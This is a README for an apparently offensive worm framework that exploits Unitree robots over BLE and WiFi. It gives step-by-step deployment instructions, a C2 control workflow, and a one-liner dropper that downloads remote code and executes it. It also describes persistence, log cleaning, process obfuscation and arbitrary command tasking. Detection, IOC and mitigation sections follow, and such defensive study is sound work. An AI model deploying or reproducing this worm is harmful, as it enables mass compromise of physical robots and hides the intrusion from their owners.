# UniRoam - Autonomous Robot Worm Framework

> *"Where UniPwn meets autonomous roaming"*

## ⚠️ WARNING - RED TEAM RESEARCH TOOL

**UniRoam** is a **RED TEAM RESEARCH TOOL** designed to demonstrate wormable attack capabilities against Unitree robots for defensive research purposes. This framework should **ONLY** be used in controlled environments for security research, training, and developing defensive countermeasures.

**DO NOT USE ON DEVICES YOU DO NOT OWN OR HAVE EXPLICIT PERMISSION TO TEST.**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Components](#components)
- [Installation](#installation)
- [Usage](#usage)
- [Attack Chain](#attack-chain)
- [Defensive Analysis](#defensive-analysis)
- [Indicators of Compromise](#indicators-of-compromise)
- [Legal & Ethical](#legal--ethical)

---

## 🎯 Overview

This framework implements a complete wormable attack against Unitree robotic platforms (Go2, G1, H1, B2 series), featuring:

- **Self-Propagating**: Autonomous robot-to-robot spreading via BLE and WiFi
- **Command & Control**: Full C2 infrastructure with web dashboard
- **Multi-Stage Infection**: Minimal dropper → Full agent → Persistence
- **Operational Security**: Traffic encryption, process obfuscation, log cleaning
- **Network Topology Mapping**: Discovers and maps robot deployments
- **Remote Tasking**: Execute arbitrary commands, collect intel, control propagation

### Key Features

✅ **BLE-Based Propagation** - Infects nearby robots wirelessly  
✅ **WiFi Network Spreading** - Lateral movement across networks  
✅ **Persistent Infection** - Survives reboots via systemd, cron, rc.local  
✅ **C2 Dashboard** - Real-time monitoring and control  
✅ **Anti-Detection** - Traffic encryption, sandbox evasion, log cleaning  
✅ **Modular Architecture** - Easy to extend and customize  
✅ **Testing Framework** - Comprehensive test suite included  

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    C2 Server (c2_server.py)                 │
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │  REST API    │  │  Database    │  │  Web Dashboard  │  │
│  └──────────────┘  └──────────────┘  └─────────────────┘  │
└────────────────────────────┬────────────────────────────────┘
                             │ HTTPS/DNS Tunnel
         ┌───────────────────┼───────────────────┐
         │                   │                   │
    ┌────▼─────┐        ┌────▼─────┐       ┌────▼─────┐
    │ Robot 1  │◄──BLE──┤ Robot 2  │◄──────┤ Robot 3  │
    │ (Agent)  │        │ (Agent)  │ WiFi  │ (Agent)  │
    └──────────┘        └──────────┘       └──────────┘
         │                   │                   │
    ┌────▼──────────────────▼───────────────────▼────┐
    │        Worm Agent (worm_agent.py)              │
    │  ┌──────────┐  ┌──────────┐  ┌─────────────┐  │
    │  │ Exploit  │  │Propagate │  │ Persistence │  │
    │  │  Lib     │  │  Engine  │  │   Manager   │  │
    │  └──────────┘  └──────────┘  └─────────────┘  │
    └────────────────────────────────────────────────┘
```

---

## 📦 Components

### Core Modules

| File | Description |
|------|-------------|
| `config.py` | Centralized configuration for all components |
| `exploit_lib.py` | BLE exploit primitives (refactored from unitree_hack.py) |
| `worm_agent.py` | Main worm agent running on infected robots |
| `c2_server.py` | Command & control server with web dashboard |
| `propagation_engine.py` | BLE and WiFi propagation logic |
| `persistence.py` | Persistence mechanisms (systemd, cron, watchdog) |
| `payload_builder.py` | Multi-stage payload generation |
| `opsec_utils.py` | Operational security utilities |
| `test_worm.py` | Comprehensive testing framework |

### Original Files

| File | Description |
|------|-------------|
| `unitree_hack.py` | Original standalone exploit tool |
| `README.md` | Original vulnerability research documentation |

---

## 🛠️ Installation

### Prerequisites

```bash
# Python 3.8+
python3 --version

# System packages (Debian/Ubuntu)
sudo apt-get update
sudo apt-get install -y bluetooth bluez libbluetooth-dev nmap

# Python packages
pip3 install -r requirements.txt
```

### Requirements

Create `requirements.txt`:

```
bleak>=0.21.0
pycryptodomex>=3.19.0
fastapi>=0.104.0
uvicorn>=0.24.0
aiohttp>=3.9.0
```

### Installation Steps

```bash
# 1. Clone repository
git clone https://github.com/yourusername/unipwn.git
cd unipwn

# 2. Install dependencies
pip3 install -r requirements.txt

# 3. Configure C2 server
export C2_HOST="your.c2.domain"
export C2_PORT="8443"
export C2_API_KEY="your-secret-api-key"
export C2_OPERATOR_PASSWORD="your-admin-password"

# 4. (Optional) Test framework
python3 test_worm.py --all
```

---

## 🚀 Usage

### Quick Start: Standalone Exploitation

Use the original tool for single-target attacks:

```bash
# Enable SSH on robot
python3 unitree_hack.py --enable-ssh

# Reboot robot
python3 unitree_hack.py --reboot

# Custom command
python3 unitree_hack.py
# Follow interactive prompts
```

### Advanced: Wormable Attack

#### 1. Start C2 Server

```bash
# Start C2 server
python3 c2_server.py

# Access dashboard at http://localhost:8443/
# Default password: admin123 (CHANGE THIS!)
```

#### 2. Deploy Worm to Patient Zero

```bash
# Generate payload
python3 -c "
from payload_builder import PayloadManager
pm = PayloadManager('http://your-c2-server:8443')
print(pm.generate_injection_command('robot_001'))
"

# Inject using original exploit
python3 unitree_hack.py
# Select option 2 (command injection)
# Paste generated payload
```

#### 3. Monitor Propagation

Access the web dashboard to:
- View infected robots in real-time
- Monitor propagation statistics
- Issue commands to all infected robots
- Visualize infection chain

#### 4. Control Worm

```bash
# Using API (with authentication token)
curl -X POST http://your-c2:8443/api/v1/operator/task \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "robot_id": "*",
    "task_type": "PROPAGATE_STOP"
  }'
```

### Available Commands

| Command | Description |
|---------|-------------|
| `PROPAGATE_START` | Start autonomous propagation |
| `PROPAGATE_STOP` | Stop propagation |
| `COLLECT_INTEL` | Gather system information |
| `EXECUTE_CMD` | Run arbitrary shell command |
| `SELF_DESTRUCT` | Remove worm and clean traces |
| `UPDATE_PAYLOAD` | Push new worm version |

---

## 🔗 Attack Chain

### Stage 0: Initial Compromise

1. **BLE Discovery** - Scan for nearby Unitree robots
2. **Handshake** - Send "unitree" to bypass authentication
3. **Serial Verification** - Retrieve serial number to confirm access
4. **Payload Injection** - Inject dropper via WiFi SSID/password fields

### Stage 1: Agent Download

```python
# Minimal dropper (injected via Stage 0)
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://c2/api/v1/payload/stage1').read())"
```

Downloads full agent from C2 server.

### Stage 2: Persistence Establishment

1. Install systemd service
2. Add cron job
3. Modify rc.local
4. Start watchdog process
5. Obfuscate process name
6. Clean logs

### Stage 3: Autonomous Propagation

1. **BLE Scanning** - Find nearby robots every 2 minutes
2. **Target Selection** - Filter infected/blacklisted robots
3. **Rate Limiting** - Max 5 infections per hour
4. **Infection** - Execute full exploit chain
5. **C2 Reporting** - Report success to C2
6. **Network Scanning** - Discover robots on same WiFi network
7. **Repeat** - Continue until stopped

---

## 🛡️ Defensive Analysis

### Detection Strategies

#### Network-Based Detection

```bash
# Monitor for suspicious BLE activity
sudo hcidump -i hci0 -X

# Monitor C2 traffic patterns
# Look for:
# - Regular beacons (60-300 second intervals)
# - Traffic to unusual domains
# - Encrypted payloads in HTTP traffic
```

#### Host-Based Detection

```bash
# Check for persistence mechanisms
systemctl list-units | grep -i unitree
crontab -l | grep unitree
cat /etc/rc.local

# Check for suspicious processes
ps aux | grep -E 'kworker|systemd-udevd' | grep python

# Check network connections
netstat -antp | grep ESTABLISHED
```

#### File System Artifacts

```bash
# Worm installation paths
ls -la /usr/local/bin/unitree*
ls -la /etc/systemd/system/unitree*

# Infection tracking
ls -la /tmp/.unitree*

# Configuration
ls -la /etc/unitree/
```

---

## 🔍 Indicators of Compromise (IOCs)

### File System IOCs

```
/usr/local/bin/unitree-updater          # Worm executable
/usr/local/bin/unitree-watchdog         # Watchdog script
/etc/systemd/system/unitree-service.service  # Systemd service
/etc/unitree/.config                    # Config file
/var/log/unitree-service.log           # Log file
/tmp/.unitree_targets                  # Infection history
/tmp/.unitree_blacklist                # Failed targets
```

### Network IOCs

```
C2 Communication:
- Beacon interval: 60-300 seconds
- User-Agent: Various (obfuscated)
- Endpoints: /api/v1/beacon, /api/v1/tasks, /api/v1/report

DNS Tunneling:
- Suspicious long subdomain queries
- High frequency DNS queries
- Queries to unusual TLDs
```

### Process IOCs

```
Process Names (obfuscated):
- [kworker/0:1]
- systemd-udevd
- systemd-journald
- rsyslogd
- dbus-daemon

Command Line:
- python3 /usr/local/bin/unitree-updater
- /usr/bin/python3 with suspicious arguments
```

### Behavioral IOCs

- Unusual BLE scanning activity
- Regular outbound HTTPS to non-Unitree domains
- Process with low CPU but persistent network activity
- Modified system logs (gaps in timestamps)
- Cleared bash history
- New systemd services

---

## 🔬 Mitigation Strategies

### Immediate Actions

1. **Isolate Infected Robots**
   ```bash
   # Disable BLE
   sudo systemctl stop bluetooth
   
   # Disconnect from WiFi
   sudo ifconfig wlan0 down
   ```

2. **Remove Worm**
   ```bash
   # Stop services
   sudo systemctl stop unitree-service
   sudo systemctl disable unitree-service
   
   # Remove files
   sudo rm -f /usr/local/bin/unitree-*
   sudo rm -f /etc/systemd/system/unitree-*
   sudo rm -rf /etc/unitree/
   
   # Clean cron
   crontab -e  # Remove unitree entries
   ```

3. **Firmware Update**
   - Update to latest firmware (if vulnerability patched)
   - Factory reset robot

### Long-Term Prevention

1. **Network Segmentation**
   - Isolate robots on separate VLAN
   - Implement strict firewall rules
   - Monitor BLE and WiFi traffic

2. **Authentication**
   - Change default credentials
   - Implement mutual TLS for robot communications
   - Use unique cryptographic keys per device

3. **Input Validation**
   - Sanitize WiFi SSID/password inputs
   - Implement command injection protections
   - Use parameterized commands

4. **Monitoring**
   - Deploy IDS/IPS rules for IOCs
   - Monitor for unusual BLE activity
   - Log all robot communications
   - Alert on new systemd services

5. **Patch Management**
   - Apply security updates promptly
   - Subscribe to security advisories
   - Regular security assessments

---

## 📊 Testing & Validation

### Run Test Suite

```bash
# Full test suite
python3 test_worm.py --all

# Unit tests only
python3 test_worm.py --unit

# Propagation simulation
python3 test_worm.py --simulate

# Performance benchmarks
python3 test_worm.py --benchmark
```

### Controlled Environment Setup

```bash
# Use debug mode to simulate infections without actual exploitation
export WORM_DEBUG=true
python3 worm_agent.py --debug
```

---

## ⚖️ Legal & Ethical Considerations

### Responsible Use

This framework is provided for:
- ✅ Security research in controlled environments
- ✅ Red team training and exercises
- ✅ Developing defensive countermeasures
- ✅ Educational purposes
- ✅ Authorized penetration testing

This framework is **NOT** for:
- ❌ Unauthorized access to systems
- ❌ Malicious attacks
- ❌ Causing harm or disruption
- ❌ Commercial exploitation without permission

### Legal Notice

⚖️ **WARNING**: Unauthorized use of this software may violate laws including but not limited to:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Criminal Code (Section 342.1) - Canada
- Similar laws in other jurisdictions

**Always obtain explicit written permission before testing.**

### Disclosure

This research follows responsible disclosure practices. The vendor (Unitree Robotics) was notified of these vulnerabilities but showed no meaningful response or interest in remediation.

CVEs assigned:
- CVE-2025-35027
- CVE-2025-60017
- CVE-2025-60250
- CVE-2025-60251

---

## 🤝 Contributing

Contributions for defensive improvements are welcome:

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Create Pull Request

Focus areas:
- Detection signatures
- Mitigation techniques
- Performance improvements
- Documentation enhancements

---

## 📝 License

This project maintains the original CC BY-NC-SA 4.0 license from the base research.

**Non-Commercial Use Only** - See LICENSE file for details.

---

## 👥 Credits

**Original Research**: Bin4ry (Andreas Makris), h0stile (Kevin Finisterre), legion1581 (Konstantin Severov)

**Worm Framework**: Built upon the original vulnerability research for defensive analysis purposes.

---

## 📚 References

- [Original Research Paper](https://arxiv.org/abs/2509.14139)
- [CVE-2025-35027](https://takeonme.org/cves/cve-2025-35027/)
- [Unitree Robotics](https://www.unitree.com/)
- [BLE Security Best Practices](https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/)

---

**Remember: With great power comes great responsibility. Use this knowledge to build better, more secure systems.**

